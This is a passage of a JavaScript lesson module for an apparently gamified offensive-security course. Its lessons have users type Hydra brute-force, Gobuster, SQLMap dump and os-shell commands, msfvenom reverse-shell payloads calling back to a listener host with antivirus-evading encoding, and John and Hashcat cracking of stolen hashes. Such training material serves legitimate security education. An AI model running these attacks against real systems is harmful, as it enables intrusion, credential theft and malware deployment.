// eleventhmodule.js
// Module 11: Advanced Exploitation & Weaponization (100 Lessons)

const module11_exploitation = {
  name: "11. Exploitation & Weaponization (100 Lessons)",
  lessons: [
    // --- PHASE 1: HYDRA NETWORK BRUTE FORCING (1-20) ---
    {
      title: "Hydra SSH Basic",
      why: "Secure Shell (SSH) relies on cryptographic handshakes, but weak passwords bypass this. Hydra initiates continuous, parallel TCP handshakes on port 22, rapidly substituting passwords from your rockyou dictionary.",
      text: "Type <code>hydra -l admin -P rockyou.txt ssh://10.0.0.50</code>",
      objective: "Type hydra -l admin -P rockyou.txt ssh://10.0.0.50",
      xp: 20,
      check: (c, a) =>
        c === "hydra" &&
        a.includes("-l") &&
        a.includes("-P") &&
        a.includes("ssh://10.0.0.50"),
    },
    {
      title: "Hydra FTP Basic",
      why: "The File Transfer Protocol (FTP) authenticates in plain text. Hydra establishes a connection to port 21, programmatically submitting the USER and PASS commands in a high-speed loop.",
      text: "Type <code>hydra -l root -P rockyou.txt ftp://10.0.0.50</code>",
      objective: "Type hydra against ftp://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("ftp://10.0.0.50"),
    },
    {
      title: "Hydra Target List",
      why: "Instead of guessing a single user, the <b>-L</b> flag provides a user dictionary. Hydra calculates the Cartesian product of both lists, testing every password against every username.",
      text: "Type <code>hydra -L users.txt -P rockyou.txt ssh://10.0.0.50</code>",
      objective: "Use -L users.txt",
      xp: 25,
      check: (c, a) =>
        c === "hydra" && a.includes("-L") && a.includes("users.txt"),
    },
    {
      title: "Hydra Verbose",
      why: "When brute-forcing, servers often drop connections via rate-limiting. The <b>-V</b> (Verbose) flag exposes the raw byte-stream attempts in real-time so you can detect if a firewall is blocking you.",
      text: "Type <code>hydra -V -l root -P rockyou.txt ssh://10.0.0.50</code>",
      objective: "Use the -V flag",
      xp: 15,
      check: (c, a) => c === "hydra" && a.includes("-V"),
    },
    {
      title: "Hydra Threads",
      why: "Network latency is the bottleneck in brute-forcing. The <b>-t</b> (Tasks) flag instructs Hydra to spawn concurrent threads, opening simultaneous parallel sockets to multiply attack speed.",
      text: "Type <code>hydra -t 4 -l admin -P rockyou.txt ssh://10.0.0.50</code>",
      objective: "Use -t 4",
      xp: 25,
      check: (c, a) => c === "hydra" && a.includes("-t") && a.includes("4"),
    },
    {
      title: "Hydra Web Form",
      why: "Web logins use HTTP POST requests. The http-post-form module crafts a raw HTTP payload, injecting variables (^USER^, ^PASS^) and parsing the server's HTML response to look for the failure string.",
      text: 'Type <code>hydra -l admin -P rockyou.txt 10.0.0.50 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"</code>',
      objective: "Use http-post-form module",
      xp: 50,
      check: (c, a) => c === "hydra" && a.includes("http-post-form"),
    },
    {
      title: "Hydra RDP",
      why: "Attack the Microsoft Remote Desktop Protocol (port 3389). Hydra simulates the cryptographic NTLM/CredSSP negotiation required to authenticate against a Windows UI session.",
      text: "Type <code>hydra -l Administrator -P rockyou.txt rdp://10.0.0.50</code>",
      objective: "Attack rdp://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("rdp://10.0.0.50"),
    },
    {
      title: "Hydra SMB",
      why: "Server Message Block (port 445) is the core of Windows file sharing and Active Directory. Brute-forcing this grants access to the internal domain architecture.",
      text: "Type <code>hydra -l admin -P rockyou.txt smb://10.0.0.50</code>",
      objective: "Attack smb://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("smb://10.0.0.50"),
    },
    {
      title: "Hydra Telnet",
      why: "Telnet is a legacy protocol (port 23) that transmits all keystrokes in raw plaintext. If discovered on a modern network, it is a primary vector for compromise.",
      text: "Type <code>hydra -l root -P rockyou.txt telnet://10.0.0.50</code>",
      objective: "Attack telnet://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("telnet://10.0.0.50"),
    },
    {
      title: "Hydra Output File",
      why: "Brute forcing can take hours. The <b>-o</b> flag ensures that when a mathematical match is finally found, the credentials are saved directly to a file before the connection drops.",
      text: "Type <code>hydra -l root -P rockyou.txt ssh://10.0.0.50 -o cracked.txt</code>",
      objective: "Use -o cracked.txt",
      xp: 30,
      check: (c, a) =>
        c === "hydra" && a.includes("-o") && a.includes("cracked.txt"),
    },
    {
      title: "Hydra Port Override",
      why: "If administrators move SSH from port 22 to a high port (e.g., 2222) to avoid scanners, the <b>-s</b> flag forces Hydra to manually target the obfuscated port.",
      text: "Type <code>hydra -s 2222 -l root -P rockyou.txt ssh://10.0.0.50</code>",
      objective: "Use -s 2222",
      xp: 30,
      check: (c, a) => c === "hydra" && a.includes("-s") && a.includes("2222"),
    },
    {
      title: "Hydra Exit on Success",
      why: "To prevent locking out an account by triggering Active Directory password failure limits, the <b>-f</b> flag aborts the entire attack loop the microsecond a valid login is discovered.",
      text: "Type <code>hydra -f -l root -P rockyou.txt ssh://10.0.0.50</code>",
      objective: "Use the -f flag",
      xp: 25,
      check: (c, a) => c === "hydra" && a.includes("-f"),
    },
    {
      title: "Hydra Empty Pass",
      why: "Many development servers are left with no password. The <b>-e e</b> flag instructs the engine to attempt an empty byte-string (NULL password) authentication.",
      text: "Type <code>hydra -e e -l root ssh://10.0.0.50</code>",
      objective: "Use -e e",
      xp: 25,
      check: (c, a) => c === "hydra" && a.includes("-e") && a.includes("e"),
    },
    {
      title: "Hydra Same Pass",
      why: "Humans are lazy. The <b>-e s</b> flag automatically attempts to use the username as the password (e.g., admin:admin), bypassing the need for a dictionary.",
      text: "Type <code>hydra -e s -l admin ssh://10.0.0.50</code>",
      objective: "Use -e s",
      xp: 25,
      check: (c, a) => c === "hydra" && a.includes("-e") && a.includes("s"),
    },
    {
      title: "Hydra Combined e",
      why: "Combine the heuristic checks. <b>-e ns</b> tests a NULL password, the username as the password, and the username reversed.",
      text: "Type <code>hydra -e ns -l root ssh://10.0.0.50</code>",
      objective: "Use -e ns",
      xp: 30,
      check: (c, a) => c === "hydra" && a.includes("-e") && a.includes("ns"),
    },
    {
      title: "Hydra MySQL",
      why: "Attack the raw database socket (port 3306). Bypassing the web application and attacking the database engine directly gives you absolute control over the data tables.",
      text: "Type <code>hydra -l root -P rockyou.txt mysql://10.0.0.50</code>",
      objective: "Attack mysql://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("mysql://10.0.0.50"),
    },
    {
      title: "Hydra Postgres",
      why: "Attack PostgreSQL (port 5432). Many enterprise applications use Postgres. Gaining access here often leads to Remote Code Execution via CVE-2019-9193.",
      text: "Type <code>hydra -l postgres -P rockyou.txt postgres://10.0.0.50</code>",
      objective: "Attack postgres://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("postgres://10.0.0.50"),
    },
    {
      title: "Hydra VNC",
      why: "Virtual Network Computing (port 5900) grants full graphical desktop access. It is notoriously insecure and often relies on short, 8-character passwords.",
      text: "Type <code>hydra -l admin -P rockyou.txt vnc://10.0.0.50</code>",
      objective: "Attack vnc://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("vnc://10.0.0.50"),
    },
    {
      title: "Hydra SMTP",
      why: "Simple Mail Transfer Protocol (port 25). Brute forcing an email account allows you to bypass Two-Factor Authentication (2FA) by intercepting reset links.",
      text: "Type <code>hydra -l admin -P rockyou.txt smtp://10.0.0.50</code>",
      objective: "Attack smtp://10.0.0.50",
      xp: 20,
      check: (c, a) => c === "hydra" && a.includes("smtp://10.0.0.50"),
    },
    {
      title: "Read Cracked Log",
      why: "Validate the cryptographic breaches exported to your forensic file.",
      text: "Type <code>cat cracked.txt</code>",
      objective: "Read cracked.txt",
      xp: 10,
      check: (c, a) => c === "cat" && a[0] === "cracked.txt",
    },

    // --- PHASE 2: GOBUSTER & SQLMAP (21-40) ---
    {
      title: "Gobuster Dir Mode",
      why: "Web servers only show you linked files. Gobuster blasts thousands of HTTP GET requests to unlinked endpoints. If the server replies with '200 OK' instead of '404 Not Found', a hidden attack surface is exposed.",
      text: "Type <code>gobuster dir -u http://10.0.0.50 -w words.txt</code>",
      objective: "Use gobuster dir",
      xp: 20,
      check: (c, a) =>
        c === "gobuster" &&
        a.includes("dir") &&
        a.includes("-u") &&
        a.includes("-w"),
    },
    {
      title: "Gobuster Threads",
      why: "Network I/O is the bottleneck in fuzzing. By allocating 50 concurrent Goroutines (-t 50), Gobuster saturates the network link, drastically reducing the time it takes to exhaust the dictionary.",
      text: "Type <code>gobuster dir -u http://10.0.0.50 -w words.txt -t 50</code>",
      objective: "Use -t 50",
      xp: 25,
      check: (c, a) => c === "gobuster" && a.includes("-t") && a.includes("50"),
    },
    {
      title: "Gobuster Extensions",
      why: "Developers often leave backup files behind. The <b>-x</b> flag appends specific extensions (.php, .bak) to every word in your dictionary, hunting for exposed backend source code.",
      text: "Type <code>gobuster dir -u http://10.0.0.50 -w words.txt -x php,bak</code>",
      objective: "Use -x php,bak",
      xp: 30,
      check: (c, a) =>
        c === "gobuster" && a.includes("-x") && a.includes("php,bak"),
    },
    {
      title: "Gobuster Hide Status",
      why: "Some servers use custom error pages (HTTP 302 redirects) instead of 404s. The <b>-b</b> (Blacklist) flag ignores specific HTTP status codes to prevent your screen from filling with false positives.",
      text: "Type <code>gobuster dir -u http://10.0.0.50 -w words.txt -b 404,302</code>",
      objective: "Use -b 404",
      xp: 30,
      check: (c, a) =>
        c === "gobuster" && a.includes("-b") && a.includes("404,302"),
    },
    {
      title: "Gobuster Subdomains",
      why: "Subdomain enumeration uses DNS rather than HTTP. Gobuster checks the DNS resolver to see if internal subdomains (like 'dev.evil.com' or 'staging.evil.com') have valid IP records.",
      text: "Type <code>gobuster dns -d evil.com -w words.txt</code>",
      objective: "Use gobuster dns",
      xp: 25,
      check: (c, a) =>
        c === "gobuster" && a.includes("dns") && a.includes("-d"),
    },
    {
      title: "Gobuster Vhost",
      why: "Sometimes subdomains don't have DNS records. The VHOST mode manipulates the 'Host' HTTP header directly, asking the server if it is secretly hosting another website on the exact same IP address.",
      text: "Type <code>gobuster vhost -u http://evil.com -w words.txt</code>",
      objective: "Use gobuster vhost",
      xp: 25,
      check: (c, a) => c === "gobuster" && a.includes("vhost"),
    },
    {
      title: "Gobuster Output",
      why: "Save the discovered hidden URL paths to an external file so they can be piped into an automated vulnerability scanner later.",
      text: "Type <code>gobuster dir -u http://10.0.0.50 -w words.txt -o dirs.txt</code>",
      objective: "Use -o dirs.txt",
      xp: 20,
      check: (c, a) =>
        c === "gobuster" && a.includes("-o") && a.includes("dirs.txt"),
    },
    {
      title: "Read Dirs Log",
      why: "View your discovered attack surface.",
      text: "Type <code>cat dirs.txt</code>",
      objective: "Read dirs.txt",
      xp: 10,
      check: (c, a) => c === "cat" && a[0] === "dirs.txt",
    },
    {
      title: "SQLMap Basic",
      why: "SQL Injection occurs when user input modifies the backend database query. SQLMap mathematically tests URL parameters, measuring server response times and boolean logic changes to detect flaws.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1"</code>',
      objective: "Run sqlmap against a URL",
      xp: 20,
      check: (c, a) => c === "sqlmap" && a.includes("-u"),
    },
    {
      title: "SQLMap Batch Mode",
      why: "SQLMap prompts you constantly during an attack. The <b>--batch</b> flag auto-answers 'Yes' to everything, allowing the tool to run unattended in automated CI/CD pipelines.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" --batch</code>',
      objective: "Use --batch",
      xp: 25,
      check: (c, a) => c === "sqlmap" && a.includes("--batch"),
    },
    {
      title: "SQLMap Enumerate DBS",
      why: "Once injection is confirmed, the <b>--dbs</b> flag extracts the schema architecture, forcing the server to output a list of every database name hosted on the backend.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" --dbs</code>',
      objective: "Use --dbs",
      xp: 30,
      check: (c, a) => c === "sqlmap" && a.includes("--dbs"),
    },
    {
      title: "SQLMap Target DB",
      why: "Focus the attack. The <b>-D</b> flag selects a specific database, and <b>--tables</b> enumerates its tables. This targets your extraction, avoiding dumping gigabytes of useless analytics data.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" -D admin_db --tables</code>',
      objective: "Use -D admin_db --tables",
      xp: 35,
      check: (c, a) =>
        c === "sqlmap" && a.includes("-D") && a.includes("--tables"),
    },
    {
      title: "SQLMap Target Table",
      why: "Narrow the vector. The <b>-T</b> flag targets a specific table (like 'users'), and <b>--columns</b> extracts the headers (like 'username', 'password_hash').",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" -D admin_db -T users --columns</code>',
      objective: "Use -T users --columns",
      xp: 40,
      check: (c, a) =>
        c === "sqlmap" && a.includes("-T") && a.includes("--columns"),
    },
    {
      title: "SQLMap Dump Table",
      why: "The <b>--dump</b> flag executes UNION-based or Error-based injection loops, systematically extracting the raw hex data of every single row in the targeted table.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" -D admin_db -T users --dump</code>',
      objective: "Use --dump",
      xp: 50,
      check: (c, a) => c === "sqlmap" && a.includes("--dump"),
    },
    {
      title: "SQLMap Dump All",
      why: "The nuclear option. <b>--dump-all</b> violently extracts the entire database engine contents. This generates massive network noise and is highly likely to trigger security alarms.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" --dump-all</code>',
      objective: "Use --dump-all",
      xp: 50,
      check: (c, a) => c === "sqlmap" && a.includes("--dump-all"),
    },
    {
      title: "SQLMap Forms",
      why: "Instead of attacking a URL parameter, the <b>--forms</b> flag automatically parses the HTML of a page, finds login input boxes, and brute-forces SQL payloads directly into the POST request fields.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/login.php" --forms</code>',
      objective: "Use --forms",
      xp: 35,
      check: (c, a) => c === "sqlmap" && a.includes("--forms"),
    },
    {
      title: "SQLMap Crawl",
      why: "The <b>--crawl</b> flag turns SQLMap into an automated spider. It maps the entire website and tests every single URL and form it finds against its injection database.",
      text: 'Type <code>sqlmap -u "http://10.0.0.50" --crawl=2</code>',
      objective: "Use --crawl=2",
      xp: 40,
      check: (c, a) => c === "sqlmap" && a.includes("--crawl=2"),
    },
    {
      title: "SQLMap Post Request",
      why: "Complex attacks require authentication cookies. You can intercept a valid web request using a proxy (like Burp Suite), save it to a text file, and feed it to SQLMap via the <b>-r</b> flag.",
      text: "Type <code>sqlmap -r request.txt --dbs</code>",
      objective: "Use -r request.txt",
      xp: 35,
      check: (c, a) =>
        c === "sqlmap" && a.includes("-r") && a.includes("request.txt"),
    },
    {
      title: "SQLMap OS Shell",
      why: "If the database user has FILE privileges, SQLMap can write a malicious PHP/ASP stub directly to the web root, bridging the gap from database injection to Remote Code Execution (RCE).",
      text: 'Type <code>sqlmap -u "http://10.0.0.50/view.php?id=1" --os-shell</code>',
      objective: "Use --os-shell",
      xp: 50,
      check: (c, a) => c === "sqlmap" && a.includes("--os-shell"),
    },
    {
      title: "Clear Target Cache",
      why: "SQLMap saves previous attack states to speed up future tests. If a target server updates its firewall, you must <b>--flush-session</b> to force SQLMap to re-evaluate the target from scratch.",
      text: "Type <code>sqlmap --flush-session</code>",
      objective: "Use --flush-session",
      xp: 15,
      check: (c, a) => c === "sqlmap" && a.includes("--flush-session"),
    },

    // --- PHASE 3: MSFVENOM PAYLOADS (41-60) ---
    {
      title: "MSF Windows Executable",
      why: "MSFVenom compiles raw shellcode. Here, we generate a Windows PE (Portable Executable) file containing a 'reverse_tcp' stager. When executed, it allocates executable memory and dials back to your LHOST (Local Host).",
      text: "Type <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f exe > shell.exe</code>",
      objective: "Generate windows reverse shell",
      xp: 30,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("windows/x64/shell_reverse_tcp") &&
        a.includes("shell.exe"),
    },
    {
      title: "MSF Linux ELF",
      why: "Linux uses the Executable and Linkable Format (ELF). We compile an ELF binary that hooks into the Linux kernel's networking stack, tunneling standard I/O over a TCP socket.",
      text: "Type <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f elf > shell.elf</code>",
      objective: "Generate linux ELF shell",
      xp: 30,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("linux/x64/shell_reverse_tcp") &&
        a.includes("shell.elf"),
    },
    {
      title: "MSF Mac Mach-O",
      why: "MacOS uses the Mach Object (Mach-O) architecture. This generates a payload compatible with Apple's BSD-based kernel environment.",
      text: "Type <code>msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f macho > shell.macho</code>",
      objective: "Generate macho shell",
      xp: 30,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("osx/x64/shell_reverse_tcp") &&
        a.includes("shell.macho"),
    },
    {
      title: "MSF PHP Web Shell",
      why: "Instead of compiled binaries, generate raw PHP code. If uploaded via a vulnerability, the server's PHP engine interprets the `fsockopen()` call, turning the web server into a reverse shell.",
      text: "Type <code>msfvenom -p php/reverse_php LHOST=10.0.0.99 LPORT=4444 -f raw > shell.php</code>",
      objective: "Generate php shell",
      xp: 30,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("php/reverse_php") &&
        a.includes("shell.php"),
    },
    {
      title: "MSF ASPX Web Shell",
      why: "Microsoft IIS servers use ASP.NET. This payload generates C# code wrapped in an ASPX file, designed to execute Windows cmd.exe processes via the web application pool.",
      text: "Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f aspx > shell.aspx</code>",
      objective: "Generate aspx shell",
      xp: 30,
      check: (c, a) => c === "msfvenom" && a.includes("shell.aspx"),
    },
    {
      title: "MSF JSP Web Shell",
      why: "Apache Tomcat servers use Java Server Pages. This generates a Java-based payload that invokes the `Runtime.getRuntime().exec()` class to spawn a shell.",
      text: "Type <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f raw > shell.jsp</code>",
      objective: "Generate jsp shell",
      xp: 30,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("java/jsp_shell_reverse_tcp") &&
        a.includes("shell.jsp"),
    },
    {
      title: "MSF Python Shell",
      why: "Python is natively installed on most Linux distros. This generates a script utilizing the native `socket` and `subprocess` libraries, bypassing the need for compiled C code.",
      text: "Type <code>msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f raw > shell.py</code>",
      objective: "Generate python shell",
      xp: 30,
      check: (c, a) =>
        c === "msfvenom" && a.includes("python/meterpreter/reverse_tcp"),
    },
    {
      title: "MSF Bash Shell",
      why: "Generate a pure bash script payload that utilizes the `/dev/tcp` file descriptor to bounce a shell without needing any programming languages installed.",
      text: "Type <code>msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.99 LPORT=4444 -f raw > shell.sh</code>",
      objective: "Generate bash shell",
      xp: 30,
      check: (c, a) => c === "msfvenom" && a.includes("cmd/unix/reverse_bash"),
    },
    {
      title: "MSF List Payloads",
      why: "Query the Metasploit framework for a comprehensive list of all supported CPU architectures and operating systems.",
      text: "Type <code>msfvenom -l payloads</code>",
      objective: "Use -l payloads",
      xp: 15,
      check: (c, a) =>
        c === "msfvenom" && a.includes("-l") && a.includes("payloads"),
    },
    {
      title: "MSF List Formats",
      why: "Query the framework for available output wrappers (e.g., raw, hex, executable, powershell scripts).",
      text: "Type <code>msfvenom -l formats</code>",
      objective: "Use -l formats",
      xp: 15,
      check: (c, a) =>
        c === "msfvenom" && a.includes("-l") && a.includes("formats"),
    },
    {
      title: "MSF List Encoders",
      why: "Query the framework for available cryptographic encoders used to bypass Antivirus signatures.",
      text: "Type <code>msfvenom -l encoders</code>",
      objective: "Use -l encoders",
      xp: 15,
      check: (c, a) =>
        c === "msfvenom" && a.includes("-l") && a.includes("encoders"),
    },
    {
      title: "MSF Encode Payload",
      why: "Shikata Ga Nai (It Cannot Be Helped) is a polymorphic XOR encoder. It scrambles the payload's byte signature and attaches a decoder stub that decrypts the malware only after it loads into RAM.",
      text: "Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -e x86/shikata_ga_nai -f exe > shell_enc.exe</code>",
      objective: "Use -e x86/shikata_ga_nai",
      xp: 40,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("-e") &&
        a.includes("x86/shikata_ga_nai"),
    },
    {
      title: "MSF Multiple Iterations",
      why: "Encoding multiple times (-i 5) heavily mutates the payload structure, increasing the probability of bypassing static, signature-based Antivirus engines.",
      text: "Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell_multi.exe</code>",
      objective: "Use -i 5",
      xp: 40,
      check: (c, a) => c === "msfvenom" && a.includes("-i") && a.includes("5"),
    },
    {
      title: "MSF Bad Characters",
      why: "Buffer overflows fail if the shellcode contains 'Bad Characters' (like `\\x00` Null Bytes) which prematurely terminate C-strings. The <b>-b</b> flag instructs the encoder to mathematically avoid generating these bytes.",
      text: 'Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -b "\\x00" -f exe > shell_nobad.exe</code>',
      objective: 'Use -b "\\x00"',
      xp: 40,
      check: (c, a) => c === "msfvenom" && a.includes("-b"),
    },
    {
      title: "MSF C Shellcode",
      why: "When developing custom exploits in C, you don't need a compiled `.exe`; you need the raw hex shellcode array. <b>-f c</b> outputs the payload formatted for direct injection into a C program.",
      text: "Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f c</code>",
      objective: "Use -f c",
      xp: 25,
      check: (c, a) => c === "msfvenom" && a.includes("-f") && a.includes("c"),
    },
    {
      title: "MSF Python Shellcode",
      why: "Format the hex shellcode specifically for a Python-based exploit script.",
      text: "Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f python</code>",
      objective: "Use -f python",
      xp: 25,
      check: (c, a) =>
        c === "msfvenom" && a.includes("-f") && a.includes("python"),
    },
    {
      title: "MSF Bind Shell",
      why: "If a target blocks outbound traffic, a Reverse Shell will fail. A Bind Shell opens a hidden listening port directly on the victim server, requiring the attacker to connect inward.",
      text: "Type <code>msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf > bind.elf</code>",
      objective: "Generate shell_bind_tcp",
      xp: 35,
      check: (c, a) =>
        c === "msfvenom" && a.includes("linux/x64/shell_bind_tcp"),
    },
    {
      title: "MSF Windows Meterpreter",
      why: "Standard shells only provide command-line access. Meterpreter is an advanced, memory-only payload that provides keystroke logging, webcam snapping, and process migration APIs.",
      text: "Type <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f exe > meter.exe</code>",
      objective: "Generate meterpreter",
      xp: 35,
      check: (c, a) =>
        c === "msfvenom" && a.includes("windows/meterpreter/reverse_tcp"),
    },
    {
      title: "MSF Linux Meterpreter",
      why: "Generate the Linux variant of the advanced Meterpreter payload.",
      text: "Type <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f elf > meter.elf</code>",
      objective: "Generate linux meterpreter",
      xp: 35,
      check: (c, a) =>
        c === "msfvenom" && a.includes("linux/x64/meterpreter/reverse_tcp"),
    },
    {
      title: "Verify Payload Directory",
      why: "Check your local staging environment to ensure all generated binaries compiled successfully.",
      text: "Type <code>ls -l</code>",
      objective: "Type ls -l",
      xp: 10,
      check: (c, a) => c === "ls" && a.includes("-l"),
    },

    // --- PHASE 4: PASSWORD CRACKING (JOHN & HASHCAT) (61-80) ---
    {
      title: "Unshadow Passwords",
      why: "Linux separates the usernames (`/etc/passwd`) from the encrypted hashes (`/etc/shadow`). The <b>unshadow</b> utility merges these two files into a single, specialized string format required by John the Ripper.",
      text: "Type <code>unshadow passwd.txt shadow.txt > unshadowed.txt</code>",
      objective: "Run unshadow command",
      xp: 35,
      check: (c, a) =>
        c === "unshadow" &&
        a.includes("passwd.txt") &&
        a.includes("shadow.txt") &&
        a.includes(">"),
    },
    {
      title: "John Basic",
      why: "John the Ripper computes a SHA-512 hash for every word in `rockyou.txt` and compares it to the stolen shadow hash. If the math matches, the password is cracked.",
      text: "Type <code>john --wordlist=rockyou.txt unshadowed.txt</code>",
      objective: "Use john --wordlist",
      xp: 40,
      check: (c, a) =>
        c === "john" &&
        a.includes("--wordlist=rockyou.txt") &&
        a.includes("unshadowed.txt"),
    },
    {
      title: "John Show Status",
      why: "John saves cracked hashes in a hidden `john.pot` file. The <b>--show</b> command queries this internal database to display the plaintext passwords.",
      text: "Type <code>john --show unshadowed.txt</code>",
      objective: "Use john --show",
      xp: 20,
      check: (c, a) => c === "john" && a.includes("--show"),
    },
    {
      title: "John Format Specific",
      why: "If John fails to automatically detect the hash algorithm, you must manually specify the mathematical format (e.g., raw-md5) to ensure the engine computes the dictionary correctly.",
      text: "Type <code>john --format=raw-md5 --wordlist=rockyou.txt hash.txt</code>",
      objective: "Use --format=raw-md5",
      xp: 30,
      check: (c, a) => c === "john" && a.includes("--format=raw-md5"),
    },
    {
      title: "John Zip2John",
      why: "You cannot crack a `.zip` file directly. You must use <b>zip2john</b> to extract the file's internal cryptographic salt and password hash headers into a flat text format.",
      text: "Type <code>zip2john secure.zip > zip_hash.txt</code>",
      objective: "Use zip2john",
      xp: 35,
      check: (c, a) => c === "zip2john" && a.includes("secure.zip"),
    },
    {
      title: "John Crack Zip",
      why: "Now that the hash headers are isolated, unleash the CPU cracking engine against the encrypted archive.",
      text: "Type <code>john --wordlist=rockyou.txt zip_hash.txt</code>",
      objective: "Crack the zip hash",
      xp: 30,
      check: (c, a) => c === "john" && a.includes("zip_hash.txt"),
    },
    {
      title: "John SSH2John",
      why: "If you steal an encrypted `id_rsa` SSH private key, you must extract its internal passphrase hash (PBKDF2) before you can attempt to crack it.",
      text: "Type <code>ssh2john id_rsa > ssh_hash.txt</code>",
      objective: "Use ssh2john",
      xp: 35,
      check: (c, a) => c === "ssh2john" && a.includes("id_rsa"),
    },
    {
      title: "John Crack SSH",
      why: "Execute a dictionary attack against the SSH private key passphrase hash.",
      text: "Type <code>john --wordlist=rockyou.txt ssh_hash.txt</code>",
      objective: "Crack ssh_hash",
      xp: 30,
      check: (c, a) => c === "john" && a.includes("ssh_hash.txt"),
    },
    {
      title: "Hashcat MD5",
      why: "Hashcat utilizes the massive parallel processing cores of modern GPUs. <b>Mode 0</b> computes pure MD5. <b>Attack Mode 0 (-a 0)</b> specifies a straight dictionary-to-hash comparison attack.",
      text: "Type <code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code>",
      objective: "Use hashcat -m 0",
      xp: 40,
      check: (c, a) =>
        c === "hashcat" &&
        a.includes("-m") &&
        a.includes("0") &&
        a.includes("-a") &&
        a.includes("0"),
    },
    {
      title: "Hashcat SHA1",
      why: "To crack a SHA-1 hash, update the cryptographic module flag to <b>Mode 100</b>.",
      text: "Type <code>hashcat -m 100 -a 0 hash.txt rockyou.txt</code>",
      objective: "Use hashcat -m 100",
      xp: 40,
      check: (c, a) => c === "hashcat" && a.includes("-m") && a.includes("100"),
    },
    {
      title: "Hashcat SHA256",
      why: "To crack a heavily secure SHA-256 hash, update the cryptographic module to <b>Mode 1400</b>.",
      text: "Type <code>hashcat -m 1400 -a 0 hash.txt rockyou.txt</code>",
      objective: "Use hashcat -m 1400",
      xp: 40,
      check: (c, a) =>
        c === "hashcat" && a.includes("-m") && a.includes("1400"),
    },
    {
      title: "Hashcat NTLM",
      why: "When exploiting Windows Active Directory, you steal NTLM hashes. <b>Mode 1000</b> configures the GPU to compute MD4-based Windows NTLM cryptography.",
      text: "Type <code>hashcat -m 1000 -a 0 hash.txt rockyou.txt</code>",
      objective: "Use hashcat -m 1000",
      xp: 40,
      check: (c, a) =>
        c === "hashcat" && a.includes("-m") && a.includes("1000"),
    },
    {
      title: "Hashcat Linux Sha512",
      why: "Modern Linux distributions use salted SHA-512crypt. Set the module to <b>Mode 1800</b> to brute-force the `/etc/shadow` file format.",
      text: "Type <code>hashcat -m 1800 -a 0 shadow.txt rockyou.txt</code>",
      objective: "Use hashcat -m 1800",
      xp: 40,
      check: (c, a) =>
        c === "hashcat" && a.includes("-m") && a.includes("1800"),
    },
    {
      title: "Hashcat Show Results",
      why: "Like John, Hashcat saves results in a local potfile. The <b>--show</b> flag reveals the decrypted plaintext strings.",
      text: "Type <code>hashcat --show hash.txt</code>",
      objective: "Use hashcat --show",
      xp: 20,
      check: (c, a) => c === "hashcat" && a.includes("--show"),
    },
    {
      title: "Hashcat Rules",
      why: "Users rarely use pure dictionary words; they append numbers. Rule files dynamically mutate the dictionary in RAM, applying hundreds of transformations to every word before hashing.",
      text: "Type <code>hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule</code>",
      objective: "Use -r best64.rule",
      xp: 50,
      check: (c, a) =>
        c === "hashcat" && a.includes("-r") && a.includes("best64.rule"),
    },
    {
      title: "Hashcat Force",
      why: "If Hashcat detects a mismatch between OpenCL drivers and your graphics card, it aborts. <b>--force</b> commands the engine to attempt CPU execution regardless of hardware warnings.",
      text: "Type <code>hashcat -m 0 -a 0 hash.txt rockyou.txt --force</code>",
      objective: "Use --force",
      xp: 15,
      check: (c, a) => c === "hashcat" && a.includes("--force"),
    },
    {
      title: "Generate Custom Wordlist",
      why: "Often, target profiling yields specific passwords. Generate a highly targeted custom dictionary.",
      text: 'Type <code>echo "password123" > custom.txt</code>',
      objective: "Create custom.txt",
      xp: 15,
      check: (c, a) =>
        c === "echo" && a.includes(">") && a.includes("custom.txt"),
    },
    {
      title: "Append Wordlist",
      why: "Add secondary permutations to your custom list.",
      text: 'Type <code>echo "admin123" >> custom.txt</code>',
